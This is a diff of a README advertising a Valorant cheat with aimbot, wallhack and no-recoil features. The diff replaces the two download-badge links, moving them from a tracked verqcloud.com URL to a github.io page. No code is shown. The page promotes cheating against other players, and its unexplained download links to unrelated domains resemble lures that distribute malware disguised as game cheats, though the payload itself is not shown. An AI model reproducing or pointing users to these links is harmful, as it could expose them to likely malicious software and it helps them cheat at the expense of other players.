@@ -2,7 +2,7 @@
 
 A cheat for *Valorant* that allows players to gain an unfair advantage by providing various features such as aimbot, wallhack, and no recoil. These cheats modify the game mechanics to make it easier for players to win matches or perform actions that would normally be difficult or impossible. The cheat typically includes a user interface for toggling different features during gameplay.
 
-[![Download Valorant Cheat](https://img.shields.io/badge/Download-Valorant%20Cheat-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Valorant Cheat](https://img.shields.io/badge/Download-Valorant%20Cheat-blueviolet)](https://vvalorant-cheat.github.io/.github/)
 
 **Key Features**:
 - **Aimbot**: Automatically locks onto enemy targets, ensuring perfect accuracy with every shot.
@@ -16,4 +16,4 @@ A cheat for *Valorant* that allows players to gain an unfair advantage by provid
 2. Follow the instructions in the readme to install and set up the cheat.
 3. Launch *Valorant* and activate the cheat with the specified hotkeys.
 
-[![Download Valorant Cheat](https://img.shields.io/badge/Download-Valorant%20Cheat-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Valorant Cheat](https://img.shields.io/badge/Download-Valorant%20Cheat-blueviolet)](https://vvalorant-cheat.github.io/.github/)
